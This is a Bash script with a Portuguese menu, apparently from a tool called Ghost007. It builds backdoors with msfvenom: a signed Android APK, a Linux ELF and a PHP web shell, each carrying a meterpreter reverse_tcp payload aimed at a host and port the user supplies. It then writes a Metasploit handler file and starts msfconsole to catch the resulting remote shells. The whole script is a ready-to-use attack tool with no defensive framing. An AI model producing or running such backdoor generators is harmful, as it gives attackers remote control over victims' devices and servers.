#!/bin/bash

rm handler.rc

touch handler.rc

clear

cat "cat-ascii"

sleep 1

menu="
{0} sair do script				{4} shell em php
{1} criar backdoor para windows
{2} criar backdoor para android
{3} criar backdoor para linux
"
echo "$menu"

read -p "Escolha uma opcão: " opcao

case "$opcao" in
	0)
		echo "tchau (^_^)／"
		exit 1
	;;

	1)
		echo "em desenvolvimento"
	;;

	2)
		echo "Sem .apk"
                read -p "Nome da backdoor: " nome2
                read -p "Seu LHOST: " lhost2
                read -p "Sua LPORT: " lport2
                echo "Criando Backdoor..."
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost2 LPORT=$lport2 -o $nome2.apk
		echo "Script salvo em: Ghost007/requisitos/creat-backdoor/$nome2.apk"
		d2j-apk-sign $nome2.apk
		rm $nome2.apk
		mv $nome2-signed.apk $nome2.apk
                printf "use exploit/multi/handler \n" > handler.rc
                printf "set payload android/meterpreter/reverse_tcp \n" >> handler.rc
                printf "set LHOST $lhost2 \n" >> handler.rc
                printf "set LPORT $lport2 \n" >> handler.rc
                printf "set ExitOnSession false \n" >> handler.rc
                printf "run -j -z" >> handler.rc
                msfconsole -r handler.rc

	;;

	3)
		echo "Sem .elf"
                read -p "Nome da backdoor: " nome3
                read -p "Seu LHOST: " lhost3
                read -p "Sua LPORT: " lport3
                echo "Criando Backdoor..."
                msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost3 LPORT=$lport3 -f elf -o $nome3.elf
		echo "Script salvo em: Ghost007/requisitos/creat-backdoor/$nome3.elf"
		chmod +x $nome3.elf
		printf "use exploit/multi/handler \n" > handler.rc
		printf "set payload linux/x86/meterpreter/reverse_tcp \n" >> handler.rc
                printf "set LHOST $lhost3 \n" >> handler.rc
                printf "set LPORT $lport3 \n" >> handler.rc
                printf "set ExitOnSession false \n" >> handler.rc
                printf "run -j -z" >> handler.rc
                msfconsole -r handler.rc

	;;

	4)
		echo "Sem .php"
                read -p "Nome da backdoor: " nome4
                read -p "Seu LHOST: " lhost4
                read -p "Sua LPORT: " lport4
                echo "Criando Backdoor..."
                msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost4 LPORT=$lport4 -o $nome4.php
		echo "Script salvo em: Ghost007/requisitos/creat-backdoor/$nome4.php"
		chmod +x $nome4.php
                printf "use exploit/multi/handler \n" > handler.rc
                printf "set payload php/meterpreter/reverse_tcp \n" >> handler.rc
                printf "set LHOST $lhost4 \n" >> handler.rc
                printf "set LPORT $lport4 \n" >> handler.rc
                printf "set ExitOnSession false \n" >> handler.rc
                printf "run -j -z" >> handler.rc
                msfconsole -r handler.rc
	;;

	*)
		echo -e "\e[33m[!]Opção invalida"
	;;

esac
